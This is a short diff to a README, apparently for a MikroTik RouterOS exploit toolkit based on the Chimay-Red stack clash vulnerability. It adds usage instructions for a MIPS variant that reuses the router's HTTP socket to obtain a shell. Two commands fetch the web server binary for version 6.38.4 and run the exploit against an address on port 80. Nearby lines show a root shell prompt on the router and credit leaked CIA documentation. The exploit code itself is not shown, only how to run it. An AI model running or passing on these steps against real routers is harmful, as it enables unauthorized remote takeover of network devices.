@@ -115,7 +115,15 @@ Escape character is '^]'.
 
 MikroTik v6.38.4 (stable)
 / #
+```  
+
+## StackClash_resock_mips  
+Reuse the http socket to spawn a shell, so you can have a shell without a reverse connection.  
 ```
+$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary
+```
+
 # FAQ
 ## Where does one get the chimay-red.py file, that this tool kit relies on?  
 This is a reverse engineering of leaked CIA documentation.  
